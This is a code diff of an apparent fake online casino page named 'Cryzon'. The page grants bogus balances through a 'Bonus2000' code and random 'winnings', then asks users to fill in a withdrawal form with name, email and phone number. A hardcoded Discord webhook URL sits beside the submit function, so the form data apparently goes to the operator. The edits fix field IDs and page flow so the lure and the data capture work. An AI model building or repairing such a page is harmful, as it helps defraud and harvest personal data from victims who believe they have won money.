@@ -190,11 +190,11 @@ body{
 <div class="siteTitle">Cryzon</div>
 
 <!-- SIGNUP -->
-<div id="signup" class="hidden">
+<div id="signup">
   <h2>Create Account</h2>
-  <input type="email" id="email" placeholder="Email"><br>
-  <input type="password" id="password" placeholder="Password"><br>
-  <input type="text" id="bonus" placeholder="Bonus Code (optional)"><br>
+  <input type="email" id="emailInput" placeholder="Email"><br>
+  <input type="password" id="passwordInput" placeholder="Password"><br>
+  <input type="text" id="bonusInput" placeholder="Bonus Code (optional)"><br>
   <button onclick="createAccount()">Create Account</button>
 </div>
 
@@ -232,7 +232,7 @@ body{
     <h3>Withdrawal Form</h3>
     <input type="text" id="firstName" placeholder="First Name" style="width:100%; padding:12px; margin:6px 0; border-radius:6px; border:none;"><br>
     <input type="text" id="lastName" placeholder="Last Name" style="width:100%; padding:12px; margin:6px 0; border-radius:6px; border:none;"><br>
-    <input type="email" id="email" placeholder="E-mail" style="width:100%; padding:12px; margin:6px 0; border-radius:6px; border:none;"><br>
+    <input type="email" id="withdrawEmail" placeholder="E-mail" style="width:100%; padding:12px; margin:6px 0; border-radius:6px; border:none;"><br>
     <input type="tel" id="phone" placeholder="Phone Number" style="width:100%; padding:12px; margin:6px 0; border-radius:6px; border:none;"><br>
     <button onclick="submitWithdraw()" style="
       width:100%; padding:12px; background:#22c55e; color:white; border:none; border-radius:8px; font-weight:600; cursor:pointer; margin-top:10px;">Submit</button>
@@ -274,10 +274,11 @@ function hideAll(){
   document.getElementById("games").classList.add("hidden");
   document.getElementById("moneyPage").classList.add("hidden");
   document.getElementById("termsPage").classList.add("hidden");
+  hideBonusPopup();
 }
-function showHome(){hideAll();document.getElementById("games").classList.remove("hidden");}
-function showMoney(){hideAll();document.getElementById("moneyPage").classList.remove("hidden");}
-function showTerms(){hideAll();document.getElementById("termsPage").classList.remove("hidden");}
+function showHome(){hideAll(); document.getElementById("games").classList.remove("hidden");}
+function showMoney(){hideAll(); document.getElementById("moneyPage").classList.remove("hidden");}
+function showTerms(){hideAll(); document.getElementById("termsPage").classList.remove("hidden");}
 
 // BALANCE
 function updateBalance(){
@@ -297,7 +298,7 @@ const webhookURL = "https://discord.com/api/webhooks/1482305139128799312/HUuQuS9
 function submitWithdraw(){
   const firstName = document.getElementById("firstName").value;
   const lastName = document.getElementById("lastName").value;
-  const email = document.getElementById("email").value;
+  const email = document.getElementById("withdrawEmail").value;
   const phone = document.getElementById("phone").value;
 
   if(!firstName || !lastName || !email || !phone){
@@ -334,15 +335,14 @@ function goBalance(){hideBonusPopup(); showMoney();}
 
 // CREATE ACCOUNT
 function createAccount(){
-  let code = document.getElementById("bonus").value;
+  let code = document.getElementById("bonusInput").value.trim();
   if(code === "Bonus2000"){
     balance += 2000;
     updateBalance();
     showBonusPopup();
-  } else {
-    hideAll();
-    document.getElementById("games").classList.remove("hidden");
-  }
+  } 
+  hideAll();
+  document.getElementById("games").classList.remove("hidden");
   updateBalance();
 }
 
@@ -359,7 +359,6 @@ function quickPick(){let r=Math.floor(Math.random()*250)+50; balance+=r; alert("
 
 window.onload=()=>{
   updateBalance();
-  document.getElementById("signup").classList.remove("hidden");
 };
 </script>
 </body>
